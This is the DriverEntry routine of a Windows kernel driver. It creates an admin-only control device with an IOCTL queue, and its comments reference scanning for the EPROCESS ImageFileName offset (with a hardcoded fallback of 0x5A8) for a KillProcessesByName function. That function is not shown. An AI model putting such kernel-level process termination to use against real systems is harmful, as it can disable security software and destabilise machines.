// DRIVER ENTRY
// =============================================================

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    WDF_DRIVER_CONFIG     config;
    WDF_OBJECT_ATTRIBUTES deviceAttributes;
    WDF_IO_QUEUE_CONFIG   queueConfig;
    WDFDRIVER             driver;
    WDFQUEUE              queue;
    PWDFDEVICE_INIT       deviceInit;
    UNICODE_STRING        deviceName;
    UNICODE_STRING        symbolicLink;
    NTSTATUS              status;

    DECLARE_CONST_UNICODE_STRING(sddl, L"D:P(A;;GA;;;SY)(A;;GA;;;BA)");

    // Initialise allocation tracking before any IOCTL can arrive.
    InitializeListHead(&g_AllocListHead);
    KeInitializeSpinLock(&g_AllocListLock);

    // Resolve ImageFileName offset from PsInitialSystemProcess at load time.
    // If the scan fails, KillProcessesByName falls back to offset 0x5A8.
    FindImageFileNameOffset();

    WDF_DRIVER_CONFIG_INIT(&config, WDF_NO_EVENT_CALLBACK);
    config.DriverInitFlags = WdfDriverInitNonPnpDriver;
    config.EvtDriverUnload = EvtDriverUnload;

    status = WdfDriverCreate(DriverObject, RegistryPath,
                             WDF_NO_OBJECT_ATTRIBUTES, &config, &driver);
    if (!NT_SUCCESS(status)) return status;

    deviceInit = WdfControlDeviceInitAllocate(driver, &sddl);
    if (!deviceInit) return STATUS_INSUFFICIENT_RESOURCES;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    status = WdfDeviceInitAssignName(deviceInit, &deviceName);
    if (!NT_SUCCESS(status)) {
        WdfDeviceInitFree(deviceInit);
        return status;
    }

    WdfDeviceInitSetIoType(deviceInit, WdfDeviceIoBuffered);

    WDF_OBJECT_ATTRIBUTES_INIT(&deviceAttributes);
    status = WdfDeviceCreate(&deviceInit, &deviceAttributes, &g_Device);
    if (!NT_SUCCESS(status)) return status;

    RtlInitUnicodeString(&symbolicLink, SYMBOLIC_NAME);
    status = WdfDeviceCreateSymbolicLink(g_Device, &symbolicLink);
    if (!NT_SUCCESS(status)) return status;

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig, WdfIoQueueDispatchSequential);
    queueConfig.EvtIoDeviceControl = EvtIoDeviceControl;

    status = WdfIoQueueCreate(g_Device, &queueConfig,
                              WDF_NO_OBJECT_ATTRIBUTES, &queue);
    if (!NT_SUCCESS(status)) return status;

    WdfControlFinishInitializing(g_Device);
    return STATUS_SUCCESS;
}
